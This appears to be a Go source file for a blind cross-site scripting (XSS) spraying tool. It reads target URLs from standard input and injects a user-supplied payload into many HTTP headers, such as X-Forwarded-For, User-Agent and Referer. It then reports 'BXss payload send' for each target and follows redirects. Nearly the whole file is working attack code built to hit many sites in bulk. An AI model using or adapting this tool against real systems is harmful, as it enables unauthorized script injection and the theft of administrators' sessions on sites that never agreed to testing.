package runner
import (
      "os"
      "fmt"
      "bufio"
      "strings"
      "github.com/valyala/fasthttp"
      "github.com/logrusorgru/aurora"
)

var (
headers = [...]string{
		"X-Originating-IP",
		"X-Forwarded-For",
                "X-Forwarded",
                "Forwarded-For",
                "X-Remote-IP",
                "X-Remote-Addr",
                "X-ProxyUser-Ip",
                "X-Original-URL",
                "Client-IP",
                "True-Client-IP",
                "Cluster-Client-IP",
                "X-ProxyUser-Ip",
                "X-Host",
                "X-Forwarded-Server",
                "X-HTTP-Host-Override",
                "User-Agent",
                "Referer",
               }
)


func probes (payload string,urle string) {
        req := fasthttp.AcquireRequest()
        req.SetRequestURI(urle)
     for _,e := range headers{
        req.Header.Add(e, payload)
        }
        resp := fasthttp.AcquireResponse()
        client := &fasthttp.Client{}
        client.Do(req, resp)
        sc := resp.StatusCode()
        if sc==302{
            statusCode, _, _ := client.Get(nil, urle)
            fmt.Println(urle,"BXss payload send:",aurora.Green(sc)," beacon send to redirected url:",aurora.Green(statusCode))
        }else{
        fmt.Println(urle,"BXss payload send:",aurora.Green(sc))
    }
}

func New() {
scanner := bufio.NewScanner(os.Stdin)
payload := os.Args[1]
for scanner.Scan() {
		target := strings.TrimSpace(scanner.Text())
                probes(payload,target)
}

}
